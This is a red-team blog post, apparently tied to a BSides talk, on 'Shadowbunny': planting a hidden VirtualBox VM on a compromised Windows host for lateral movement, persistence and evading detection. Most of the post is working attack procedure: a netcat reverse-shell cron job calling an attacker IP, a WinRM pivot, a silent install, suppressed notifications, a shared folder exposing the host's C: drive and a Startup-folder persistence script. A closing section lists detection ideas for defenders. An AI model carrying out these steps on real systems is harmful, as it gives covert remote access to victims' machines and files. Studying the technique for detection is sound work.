---
title: "Shadowbunny - Using virtual machines for lateral movement, persistence and to evade detections."
date: 2020-09-22T20:45:51-07:00
draft: true
tags: [
        "red",
        "blue",
        "ttp"
    ]
---

Thanks for joining BSides Singapore 2020! This is accompaning blog post for the "Shadowbunny" talk.


# Beware of the Shadowbunny

A few years ago, around 2016, I went on a relaxing two weeklong vacation. It was great to disconnect from work. I traveled to Austria, enjoying hiking in the mountains, and explored Vienna. 

When I came back to the office, the team had placed a giant bunny teddy into my chair. In retrospect, it seemed a legitimate replacement for the manager, *as hardly anyone seemed to have noticed my absence*.

At that time, I had been contemplating with the idea of using virtual machines for red teaming. Especially for lateral movement it seemed like a great way to try something new that possibly evades detections and at the same time providing a persistence mechanism.

The combination of the **“shadow manager”** that was put in my chair during vacation as replacement, plus the idea of using virtual machines for lateral movement was the beginning of the **Shadowbunny**. 

> **A Shadowbunny is a virtual machine (VM) instance that is deployed by an adversary on a target host to pivot and provide  persistence and at the same time evade detections.**

The VM itself does not have any security monitoring and is entirely attacker controlled. 

I like the term Shadowbunny because the technique allows to hide in the shadows, and well, bunnies are cute. Here is a picture of the original Shadowbunny which gave the technique the name:

![The original Shadowbunny, 2017](/blog/images/2020/shadowbunny-transparent.png)

From a red teaming point of view, the Shadowbunny TTP has been succesfully used multiple times during operations I was part of. Including for **measuring long term persistence** and also for red team operations like **cryptocurrency mining**. I can talk about such unique exercises more another time if there is interest.

**More importantly however, real-world adversaries are using virtual machines as well**. 

To give an example of a real world adversary, recently the [Rangar Locker Ransomware](https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security/) was seen using a virtual machine (VirtualBox) to hide its tracks. 

In this post we will explore usage of virtual machines for lateral movement, and why adversaries are using them, and why you should add this technique to your red teaming knowledgebase and skillset.

## Why would adversaries use virtual machines?

There a wide range of reasons for exploring virtual machines during lateral movement:

* **The VM is entirely attacker controlled** - a perfect sandbox for deployment “behind enemy” lines
* **Lack of monitoring and security controls inside the VM** – there is no anti-virus or detections inside the VM
* **Persistence** - VMs can be setup to automatically start again in case the host reboots
* **Obfuscation** - VMs can use disk encryption to make forensic investigations difficult
* **Backdoor** - Many virtualization products come with features to establish native host connections that might stay undetected (such as Shared Folders for persistent access to files on the host).
* This **attack technique is not well researched but used by real world adversaries**. We need to push the envelope to raise awareness and get better detection capabilities in place.
* A **Shadowbunny pivot creates a VM on the target to pivot and this might go under the radar**
* An interesting side effect is that a VM also limits the damage that untrusted code can cause in the environment. For instance, let’s say you run a public cryptocurrency miner during a red teaming operation. The red team reviews the code, even compiles it themselves and to add additional safety measure one can run the untrusted code in a dedicated, isolated VM.

Above points are some of the reasons we will see malware leverage virtual machines more often in the future, which brings us to the reason on starting to discuss these more thoroughly.

## Why share this?

The Shadowbunny technique is a post-exploitation scenario. This means that an adversary has compromised a target and has administrative access. There is no vulnerability per se in any information described in this post.

The fact that there is now evidence that adversaries use this technique for ransomware deployment, shows that more light has to be put on understanding how virtual machines can be misused by adversaries.

The goal is to explore what is possible and to improve detections for post-exploitation scenarios. 

So, let’s dive into the technical aspects.

# Setup and Configuration

**The first question is what virtualization product to choose from?** 

There are quite a lot of options. Initially, I used **Hyper-V**, as that ships out of box with Windows and if not enabled, can be easily enabled. 

However, that limits operations to Windows machines. If you are in a Windows only environment it’s straight forward to adjust the information in this post by using the various PowerShell commands for VM creation and so forth. There will be a little more information about Hyper-V in this post and pointers, but we will cover how to **automate VirtualBox** to help train the blue team and explore these attacks. 

Personally, I have not yet used VMWare for this technique, but I assume it works likely similar.

**VirtualBox** all around is a great product. And it is available for multiple platforms, so depending on your organization you can adjust the information in this post accordingly for other operating systems.

## Direct Host Connections
One important aspect is that some virtualization products can be configured to have direct host access. What I mean by this is for instance the creation of a **shared folder between guest and host**, depending on the product access can be given without having to authenticate over the network. **This is a backdooring technique to be aware of as blue teamer.**

For malware this is ideal because otherwise accessing files on the host would go over a remote connection, which means one has to have valid credentials to authenticate to the host at all times. That can be useful also, but it is not as neat as “native” host connection using a shared folder. 

With Hyper-V my experience in the past was that “direct” **shared folders** are a bit more difficult to setup (it requires an “Enhanced RDP session”) – this might be the reason that for instance the Ragnar Locker ransomware chose VirtualBox over Hyper-V. More research here will be needed.

For certain attacks, a persistent connection (or backdoor) to the host might not be necessary. For instance, imagine an adversary using a VM to mine cryptocurrency or perform offline password brute force attacks. In that case they only need a NAT or bridged LAN connection to reach their C2 infrastructure to share results. There is no need to ever access the host directly after deploying the VM.

For this demonstration and proof of concept, we are targeting a Windows machine (64 bit).

## Pre-requisites: Creation of a custom Shadowbunny VM

For the scenario we are walking through in this post, there are a few pre-requisites:

### Command and Control Infrastructure

The first step is to setup a basic Command & Control infrastructure (C2). For this demo, we just use `netcat` to listen for a reverse shell to connect, the attacker server is hosted at `10.10.10.10`. 

If you are familiar with C2 systems, feel free to plugin and leverage whatever works for you.

We start up our `netcat` server using:

```
sudo nc -klvp 443
```

The arguments are as follows:

* `-k` allows for multiple connections, so that netcat doesn’t entirely terminate if we exit the shell
* `-l` configures netcat as a server
* `-v` is the verbose mode, so netcat displays some more information
* `-p` specifies the port to listen on, in this case we just use port 443

That is it for the simple demo, the C2 is up and running. The following image shows this simple setup:

![Shadowbunny Command Center](/blog/images/2020/shadowbunny-c2.png)
 
Check that you can remotely connect to the endpoint to ensure the host firewall is not blocking the connection. 
During red team operation, you should use an encrypted channel, possibly using HTTPS traffic on 443 to blend in. If you are familiar with C2 products (Metasploit framework, Sliver, Cobalt Strike, Merlin,…) you can use one of those of course.

![Shadowbunny Command Center](/blog/images/2020/shadowbunny-c2-reqreq.jpg)

Above images shows using `Sliver`, a command and control system by Bishop Fox.

### Creating the Shadowbunny virtual disk image

The second pre-requisite is the Shadowbunny disk image which we must create.

**As red team you can customize a VM to your hearts content, it is fully controlled by the attacker.**

Most likely you want one that automatically connects to the C2 periodically to check for commands. Possibly enable disk encryption, uninstall any unneeded software, establish direct connections to host via a shared folder or clipboard access, disabling any AV inside, sinkholing telemetry, maybe USB access to have access to smart cards, or security keys and more.

The creation can be a lengthy and involved step depending on the red team operation. You might want to keep the size small as well to limit the amount of time it takes to perform lateral movement.  

To get started install a Ubuntu Server VM or Kali Linux on a single vhd image. For the more advanced cases and to keep VM size small, there are light-weight Linux distributions to choose from as well.  

In the end, the outcome will be a VHD disk image file (or vdi or vhdx) that is used. 

> Interesting fact: The recent “Ragnar Lock Ransomware” used an old version of Windows XP – which keeps the size of the virtual machine quite small.


**The VM can also regularly connect to the C2 server:**

This can be achieved using a cron job. If the VM runs Linux we can use the flock command as part of cron bjo as a simple solution to this:

* Edit crontab on the attack VM (I like nano):

```
sudo crontab -e
```

* Afterwards we add the following cron job to the file:

```
* * * * * /usr/bin/flock -n /tmp/zombie.lock nc 10.10.10.10 443 -e /bin/bash
```

**Explanation:** 
The `flock` command is an elegant solution to ensure the command is only running once. The `-n` option means that if the lock file at `/tmp/zombie.lock` exists, then the process will stop. If it is not yet created, then the `netcat` command will be run and connect to the server. 

Cron jobs and flock come in handy for other scenarios also.


### Optional: Shared Folders and other advanced features

To support shared folders or access the hosts clipboard, the “Guest Additions” have to be installed in the VM. More information, and options on how to install can be found on Ubuntu and VirtualBox websites.  

In this case I downloaded the ISO file directly into the VM using the following command (make sure the version matches the version that you plan to use on the victim’s host later as well):

```
wget https://download.virtualbox.org/virtualbox/6.1.8/VBoxGuestAdditions_6.1.8.iso`
```

And then installed it using the following commands:

```
sudo mkdir /mnt/cd
sudo mount VBoxGuestAdditions_6.1.8.iso /mnt/cd
sudo ./VBoxLinuxAdditions.run -–nox11
```

That’s it, the VirtualBox **Guest Additions** are now installed in the VM.

Please refer to the documentation if you are facing challenges with this step. At times this needs some debugging, as the installation of the Guest Additions can be done in a variety of ways and depends on what operating system you are using for the guest. 

Having those pre-requisites setup, we can now perform the famous **Shadowbunny pivot** using this virtual machine.


# Kicking into higher gear

Now that we setup client and server, we can start leveraging them during lateral movement. 

Let’s look at the individual steps that an adversary needs to perform:

## Step 1: Pivoting to the target

The initial step is to get code execution on the target with administrative credentials. 

In this case we just assume the red team as acquired an admin password and pivots onto a target machine during lateral movement. 

For this demo, let’s use Windows Remote Management (WinRM) and `Enter-PSSession`. In my test environment I have a self-signed certificate on the target host for the WinRM setup, and the port for secure WinRM is `5986`. The following commands do the initial pivot in this case: 

```
$sessionOptions = New-PsSessionOption -SkipCACheck
$creds = Get-Credential
Enter-PSSession -Computer dangerzone -Port 5986 -Credential $creds -SessionOption $sessionOptions -UseSSL
```

The following screenshot shows the three steps with a more detailed description below:
![Shadowbunny Pivot Admin](/blog/images/2020/shadowbunny-step1.png)
 
1.	Using `New-PsSessionOption` object to disable certificate check. The reason for this is that in my lab the target uses a self-signed certificate for WinRM, which the attacker’s machine doesn’t trust. In an enterprise setting that is usually not needed (if attack machine is domain joined)
2.	Using the `Get-Credential` command to store the admin credentials for the target host
3.	Execution of the `Enter-PSSession` command to establish a remote management session over TLS to the target computer called *“dangerzone”*. 

The result is a PowerShell command prompt on the remote host. Now we can explore creating our first Shadowbunny on the target.

## Step 2: Checking if virtualization products are present already

Some virtualization products don't go well together, so if one is present its best to piggy back on the existing technology installed. For now, we assume no other product is present on the target.

## Step 3: Download and install or enable virtualization technology

In this post we are focused on VirtualBox. 

The current installer (as of writing this) for Windows is located at https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe. 

To quickly download the installer onto the target run:

```
Invoke-WebRequest "https://download.virtualbox.org/virtualbox/6.1.8/VirtualBox-6.1.8-137981-Win.exe" -OutFile $env:TEMP\VirtualBox-6.1.8-137981-Win.exe
```

**Note:** Check the VirtualBox website, as the version could be outdated by the time you are reading this. And if you installed the Guest Additions into the VM earlier, ensure that the version numbers match.

The following screenshot shows pivoting on the target host “dangerzone” and download VirtualBox:
![Shadowbunny Download Virtual Box](/blog/images/2020/shadowbunny-step3.png)
 
The command to download VirtualBox will run for a bit, depending on your network connection.


### **Important Blue Team Tip**

In many environments that I have seen, and blue teams that I have spoken to, logging is pretty good when it comes to PowerShell command execution. 

Especially scripts that use `Invoke-WebRequest` or `WebClient` to download tools from the Internet get a lot of attention and are frequently manually investigated by an analyst.

However, there are many tactics to continue using PowerShell and still evade detections. 

>PowerShell as adversarial technique to run code will not go away, the same way as we still see malware use VBScript.

Just to give a few examples on top of my head that blue teams should look for:

* **Mount a Cloud SMB share and copy data** using a regular copy command.
* **My favorite is using a database connections** to load tools - but that’s because I used to work in the SQL Server division for many years and as the saying goes: “when all you have is a hammer, every problem looks like a nail” :)
* To highlight another tricky method, for instance **loading an XML document with an external entity** definition that contains attack payloads.
* There are many other ways an adversary can use PowerShell and hide by doing things slightly differently, then mainstream.

This should give some ideas on what unusual things adversaries might try to do when using PowerShell to get malware on hosts.

### Using Hyper-V as alternative on Windows
If you want to try the Shadowbunny TTP with Hyper-V, the product can be enabled via the following PowerShell command:

```
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V –All
```

For Hyper-V there are PowerShell commands for VM creation and so forth. More information can be found here: https://docs.microsoft.com/en-us/powershell/module/hyper-v/new-vm?view=win10-ps. 

That should get you started. I will post more details about this seperately.

However, we will not be further discussing the steps for Hyper-V, but they are similar to VirtualBox.

## Step 3: Installing VirtualBox

Now that we have VirtualBox downloaded, the tricky part is to perform silent installation, so users are unaware of the software being persisted on their machines. 

Most enterprise products allow for silent installs because the IT department need these features for rollout - and attackers are just piggy backing on that mechanism.

In this case we run:

```
VirtualBox-6.0.14-133895-Win.exe --silent --ignore-reboot --msiparams VBOX_INSTALLDESKTOPSHORTCUT=0,VBOX_INSTALLQUICKLAUNCHSHORTCUT=0
```

Take note of the command line parameters, there are options to perform a silent install and to avoid creating desktop and quick launch icons. We also want to avoid a reboot of the machine. 

Additional parameters to configure the system are at https://docs.oracle.com/en/virtualization/virtualbox/6.0/user/installation_windows.html.

The installation will take a few minutes. The following screenshot shows this in action:
![Shadowbunny VirtualBox Install](/blog/images/2020/shadowbunny-virtualbox-install.png)

After the installation completed, we can use the VBoxManage.exe to create VMs and configure them.

### The VBoxManage Command Line Interface

The VBoxManage binary is located at \Program Files\Oracle\VirtualBox\VBoxManage.exe by default, and you should be able to execute it now on the target as seen in the following screenshot:
![Shadowbunny VirtualBox Command Line Arguments](/blog/images/2020/shadowbunny-virtualbox-cmdargs.png)

The above image shows that installation worked, and we can run VBoxManage.exe successfully. 

VBoxManage offers a lot of commands and features to automate management of virtual machines. 

Feel free to explore the options, they can be useful also during your day to day non red teaming work. Other options and features are described at https://www.virtualbox.org/manual/ch08.html.

For instance, some basic commands for listing VMs are: 

```
VBoxManage list vms 
VBoxManage list runningvms
VBoxManage startvm
```

To create the new VM during lateral movement we will run a sequence of commands via VBoxManage, the management tool of VirtualBox. In the end the configuration is stored in an XML definition file, which can be registered with VBoxManage command as well.

### Disabling notifications
Optionally one can configure more settings of the product, for instance to suppress pop-up notifications:

```
VBoxManage.exe setextradata global GUI/SuppressMessages "all" 
```

Now that we have know the basics of VBoxManage, let’s create move towards creation of the VM.


## Step 5: Download the custom Shadowbunny VM disk image to the host

Similar to downloading the installation package, this can be done via multiple means. 

Let’s say we host the image on an SMB Share in Microsoft Azure:

```
Copy-Item \\smbserver\images\shadowbunny.vhd $env:USERPROFILE\VirtualBox\IT Recovery\shadowbunny.vhd
```

You might also leverage **a local file server** on your organizations Intranet or a cloud drive.  

As described in the pre-requisites, this is your customized VM. You can try to have a VM as small as possible, or just use a basic Ubuntu install (although that is a bit large) and copying will take a while, but it works fine also.

## Step 6: Configuring the VM

Now comes the most interesting part. 

Using the `createvm` command we build out the VM and register the disk image file with the VM. As said, the `VBoxManage.exe` binary is installed by default at `\Program Files\Oracle\VirtualBox` in case you have trouble locating it after installation. 

* The following command will create the new VM:

    ```
    $vmname = "IT Recovery"
    .\VBoxManage.exe createvm --name $vmname --ostype "Ubuntu" --register
    ```
    This will create the VM and also register it right away, the output is the following:

    ```
    Virtual machine 'IT Recovery' is created and registered.
    UUID: 7891a2bd-e9cc-432a-ae2a-ba1fb2de96a4
    Settings file: 'C:\Users\wuzzi\VirtualBox VMs\IT Recovery\IT Recovery.vbox'
    ```

    Notice the settings file with the `.vbox` extension. This is the xml configuration file of the VM.

* Next, we can modify the VM to fit the simulation scenario

    In this case we add a network card for instance and configure it to use NAT, so that they VM can communicate with the outside world.

    ```
    .\VBoxManage.exe modifyvm $vmname --ioapic on  # required for 64bit
    .\VBoxManage.exe modifyvm $vmname --memory 1024 --vram 128
    .\VBoxManage.exe modifyvm $vmname --nic1 nat
    .\VBoxManage.exe modifyvm $vmname --audio none
    .\VBoxManage.exe modifyvm $vmname --graphicscontroller vmsvga
    .\VBoxManage.exe modifyvm $vmname --description "Shadowbunny"
    ```

* Now it’s time to mount the Shadowbunny image

    To do that we create a storage controller

    ```
    .\VBoxManage.exe storagectl $vmname –name “SATA Controller” –add sata
    ```

* And finally attach the VHD file to the controller

    ```
    .\VBoxManage.exe storageattach $vmname –comment “Shadowbunny Disk” –storagectl “SATA Controller” –type hdd –medium “$env:USERPROFILE\VirtualBox VMs\IT Recovery\shadowbunny.vhd” –port 0
    ```

This completes the setup of our basic VM.

For deployment you can also pre-create the entire xml file and pass it into the call to `createvm` with `--register`. 

To achieve persistence on the host we can do an additional trick, which is to register a shared folder with the VM. This is what we will discuss next.


## Step 7: Optionally adding a shared folder

As we saw the settings file is named after the machine and has a `.vbox` extension. For instance, on my machine (using default settings) its located at `%USERPROFILE%\VirtualBox VMs\IT Recovery\IT Recovery.vbox`.

To create a shared folder between VM and host we can use the `sharedfolder`command:
```
.\VBoxManage.exe sharedfolder add $vmname –name shadow_c –hostpath c:\ -automount
```

Shared folders are configured via the xml configuration file. After running above command the following is visible in the configuration file:

```
<SharedFolders>
   <SharedFolder name="shadow_c" hostPath="c:\" writable="true" autoMount="true"/>
</SharedFolders>
```

Inside the VM (considering it is Linux based), one can simple mount the drive via:

```
sudo mkdir /mnt/c
sudo mount -t vboxsf shadow_c /mnt/c
```

This requires the VirtualBox **Guest Additions** to be installed in your attack VM, and it can be added to the default VM image if needed for an attack simulation as we had discussed in the pre-requisites.

At this point we are basically done, if you would open VirtualBox on the victim’s machine you would see the following UI:
![Shadowbunny VirtualBox VM ITRecovery](/blog/images/2020/shadowbunny-virtualbox-itrecovery.png)

As can be seen in in the screenshot, the virtual machine **“IT Recovery”** was successfully created and is currently powered off. Let’s power it on.


## Step 8: Launching the VM

Voila, now it’s time to start the VM. 

Go and run:
```
.\VBoxManage.exe startvm "IT Recovery" –type headless 
```
This will startup the VM and after a second print out a message like:

```
Waiting for VM "IT Recovery" to power on...
VM "IT Recovery " has been successfully started.
```

Now, the VM will boot up. 

Remember, that we added a `cron` job to the Shadowbunny VM. This means after a few moments the VM will establish a reverse shell to the command and control infrastructure.

The following screen shows the outcome as seen by the C2:
![Shadowbunny Reverse Shell](/blog/images/2020/shadowbunny-shell.png)
 

Since we also configured a shared folder to the host, we can mount the shared folder and interact with the file system on the host as seen in the following screenshot:
![Shadowbunny Shared Folder Access](/blog/images/2020/shadowbunny-sharedfolder.png)
 
The above screenshot shows the Shadowbunny VM on the compromised host connecting to the C2 infrastructure. And then from the its possible to directly access the filesystem on the host. 

**Pretty cool.  😊**

## Step 9: Automatically launching the VM upon reboot
Unlike other virtualization products on Windows (for instance Hyper-V), VirtualBox does not have a built-in way to auto start a VM when the host reboots. 

This is good, because it allows for the blue team to have more chances to detect a misuse.

To have the VM start when the host reboots, we can add the startvm command to the Startup folder, register a service or use one of the other ways to run commands at startup or boot time.

Let's look at a simple solution, which is the “Startup” folder approach. 

* Create a file `config.bat` with the following command in it:

    ```
    start /min "C:\Program Files\Oracle\VirtualBox\VBoxManage.exe" startvm "IT Recovery" –type headless
    ```

* Save the file to the victim’s startup folder at:
`%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`

Now, on the Command and Control side observe that the VM establishes a connection upon reboot when the user logs on to the workstation again.



## Endless possibilities
There seem to be endless options from an adversarial perspective on how to leverage this. I guess, people familiar with Hypervisor products can come up with more advanced attack scenarios, etc. including scary ones like sharing and accessing the webcam or microphone of the host!

**Real adversaries likely have already customized and built their own virtualization products.**


# Detection Ideas

Adversaries likely have been using this technique for a while. To get into the weeds and build detections, I think the following ideas are some good starting points:

* Look for **VM products that get installed silently**, e.g. via command line options (`–silent` and `–ignore-reboot`)
* Look for **commands that enable Hyper-V** (like `Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Hyper-V –All`)
* Individual calls might yield falls-positives but in combination with a remote connection that perform VM creation or virtualization product install can be inspected by an analyst or automation.
* **Collect telemetry on which virtual machines (and their configuration)** are installed on each host in your environments (maybe something stands out)
* **Regularly inspect VMs that are created** and configured on your machine
* **VM Size** - Typically VMs disks are GB in size and an adversary possibly attempts to create VMs with a rather unusual small footprint, maybe less then 500MB or smaller even. This is something to look out for.
* **Auto Start Detection** - On Windows VirtualBox does not have an auto-start feature AFAIK. This means that looking for startup scripts or registered services that run VBoxManage vmstart might point to interesting VM use scenarios. 
**Other VM products (Hyper-V, VMWare) do auto-start on Windows** - so be aware of that.
* **Suppressing notifications** - Looking for command line arguments that suppress notifications, similar to `setextradata global GUI/SuppressMessages "all"` might highlight places where someone actively prevents user notifications. This could be suspicious.

I imagine that real adversaries are already a step ahead and customize virtualization products for their nefarious needs. We might need better lower level monitoring capabilities and telemetry to look for that as well, like at the Hypervisor level.

If you have good ideas, please share them or submit Yara rules.

# Conclusion
In this post we discussed how virtual machines can be used during lateral movement of red teaming operations. 

We highlighted a set of VM products can be leveraged and did a deep dive with VirtualBox to create, register and use a **Shadowbunny VM to perform lateral movement**. 

We highlighted advanced scenarios like shared folders that allow an adversary to gain persistence. Finally, we discussed detection ideas that blue teams can implement.

These techniques are not well researched, and we will likely see more attacks using virtual machines in the future, hence it’s important to shine more light on it and improve understanding or exploitation scenarios, detections and mitigations.

If you found this post interesting or have feedback, you can write me at security@wunderwuzzi.net, or DM or follow me on [Twitter](https://twitter.com/@wunderwuzzi23). 

I also wrote a pretty unique [red teaming book that you can get on Amazon](https://www.amazon.com/Cybersecurity-Attacks-Strategies-practical-penetration-ebook/dp/B0822G9PTM).

Thanks for reading.

@wunderwuzzi23

## Disclaimer
Penetration testing requires authorization from proper stakeholders. Information in this post is provided for research and educational purposes to advance understanding of attacks and countermeasures to help improve the security posture of  infrastructure and systems. 



```
                / \
                / _ \
               | / \ |
               ||   || _______
               ||   || |\     \                       The SHADOWBUNNY :)
               ||   || ||\     \              
               ||   || || \    |             ...is hiding in virtual machines.
               ||   || ||  \__/
               ||   || ||   ||
                \\_/ \_/ \_//
               /   _     _   \
              /               \
              |    O     O    |
              |   \  ___  /   |                           
             /     \ \_/ /     \
            /  -----  |  --\    \
            |     \__/|\__/ \   |
            \       |_|_|       /
             \_____       _____/
                   \     /
                   |     |
```
*ASCII Art from https://www.asciiart.eu/animals/rabbits*


## References
* Ragnar Locker ransomware deploys virtual machine to dodge security (https://news.sophos.com/en-us/2020/05/21/ragnar-locker-ransomware-deploys-virtual-machine-to-dodge-security )
* VirtualBox Installation Windows ( https://docs.oracle.com/en/virtualization/virtualbox/6.0/user/installation_windows.html)
* [PenTest Magazine](https://pentestmag.com/product/pentest-healthcare-security/) - This issue of the PenTest Magazine contains the information around the Shadowbunny - it has a slightly modified content compared to the blog post. PenTest Magazine always contains other interesting articles as well, so check it out.
* Cybersecurity Attacks – Red Team Strategies (https://www.amazon.com/Cybersecurity-Attacks-Strategies-practical-penetration-ebook/dp/B0822G9PTM)
* Hyper-V New-VM (https://docs.microsoft.com/en-us/powershell/module/hyper-v/new-vm?view=win10-ps)
* VBoxManage CLI (https://www.virtualbox.org/manual/ch08.html)
* Embrace The Red Blog (https://embracethered.com)
* ASCII Art from https://www.asciiart.eu/animals/rabbits
* Hope I didn't accidently forget anyone important